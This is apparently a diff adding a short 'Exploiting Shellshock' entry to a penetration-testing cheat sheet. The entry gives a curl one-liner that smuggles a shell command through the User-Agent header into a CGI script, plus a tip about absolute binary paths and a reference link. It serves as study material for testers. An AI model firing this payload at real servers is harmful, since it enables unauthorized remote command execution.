@@ -590,5 +590,25 @@ Decoded header||payload-:```{"kid":"b854b842-0339-44da-b38f-984684b91506","alg":
 
 --------------------------
 
+### Exploiting Shellshock
+
+- Inject payload in `User-Agent` header
+
+      curl -i -H "User-agent: () { :;}; echo; [command]" [host]/[cgi_script]
+
+- The binary path should be detailed to execute shell commands e.g `/bin/ls` or `/bin/cat`
+
+![image](https://github.com/user-attachments/assets/7542f360-aeb5-4355-a2ea-cc30d3644928)
+
+
+--------------------
+
+### REFERENCES:
+
+- [Shellshock in cgi scripts](https://antonyt.com/blog/2020-03-27/exploiting-cgi-scripts-with-shellshock)
+
+--------------------
+
+
   
 
